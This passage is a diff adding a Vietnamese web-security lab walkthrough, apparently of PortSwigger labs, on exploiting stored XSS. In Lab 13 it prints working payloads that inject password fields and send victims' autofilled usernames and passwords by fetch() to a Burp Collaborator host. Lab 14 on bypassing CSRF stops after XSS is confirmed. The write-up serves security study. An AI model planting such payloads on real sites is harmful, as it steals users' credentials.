@@ -1153,4 +1153,76 @@ Có `session=3lrpvkiM99qu7nINI4P8VEi5kuq5cML7`
 
 Dùng _cookie_ đó để đăng nhập
 
+## Lab 13: Exploiting cross-site scripting to capture passwords
+
+
+![2025-12-23-14-27-32](../images/2025-12-23-14-27-32.png)
+
+Lab yêu cầu khai thác lỗ hổng XSS để có thể đánh cắp tài khoản mật khẩu của người dùng, sau đó đăng nhập vào để có thể solve
+
+![2025-12-23-14-29-03](../images/2025-12-23-14-29-03.png)
+
+Gửi một bình luận có payload XSS
+
+![2025-12-23-14-29-26](../images/2025-12-23-14-29-26.png)
+
+Vào lại trang thì có popup alert\
+--> Xác nhận rằng web có tồn tại `Stored XSS`
+
+Đề nói rằng có chức năng tự động điền `username/password` \
+Thử tạo một form có ô `input` rồi gửi request về server của mình
+
+![2025-12-23-14-39-38](../images/2025-12-23-14-39-38.png)
+
+Sau khi gửi bình luận lên, những tài khoản nào vào đọc bình luận thì đã thực hiện lệnh JS để truy vấn đến tên miền của mình
+
+--> Bây giờ cần trích xuất `username/password`
+
+![2025-12-23-14-54-39](../images/2025-12-23-14-54-39.png)
+
+```HTML
+<input name=username id=username>
+<input name=password id=password onchange="fetch('https://kbz2lwiift331yvfmosvdwdziqohc90y.oastify.com', {method:'POST', body:this.value}); alert('success')">
+```
+
+Sử dụng payload này để gửi request đến server của mình, trong đó body chính là password của người dùng
+
+![2025-12-23-14-56-29](../images/2025-12-23-14-56-29.png)
+
+Sau khi gửi comment lên thì xuất hiện form điền tài khoản mật khẩu\
+Thử điền vào
+
+![2025-12-23-14-56-39](../images/2025-12-23-14-56-39.png)
+
+Sau khi điền xong, trình duyệt hiện popup của hàm `alert` ta đã tạo
+
+![2025-12-23-14-58-20](../images/2025-12-23-14-58-20.png)
+
+Khi sang _Burp Collaborator_ thấy có một truy vấn đến server và body của nó là mật khẩu của người dùng
+
+--> Thêm vào code để có thể lấy được cả _username/password_ của người dùng gửi về _server_
+
+```HTML
+<input name=username id=username>
+<input name=password id=password onchange="fetch('https://kbz2lwiift331yvfmosvdwdziqohc90y.oastify.com', {method:'POST', body:username.value+':'+this.value}); alert('success')">
+```
+
+![2025-12-23-15-00-50](../images/2025-12-23-15-00-50.png)
+
+Khi gửi lên thì server đã nhận được cả _username_ và _password_ của `administrator`
+
+![2025-12-23-15-02-12](../images/2025-12-23-15-02-12.png)
+
+## Lab 14: Exploiting XSS to bypass CSRF defenses
+
+![2025-12-23-15-08-29](../images/2025-12-23-15-08-29.png)
+
+__Khai thác XSS để vượt qua cơ chế phòng chống CSRF__
+
+Lab yêu cầu lấy được mã CSRF của nạn nhân rồi đổi email của người đó
+
+![2025-12-23-15-10-49](../images/2025-12-23-15-10-49.png)
+
+Khi vào gửi bình luận có payload XSS thì có popup nổi lên\
+--> Xác nhận có XSS
 
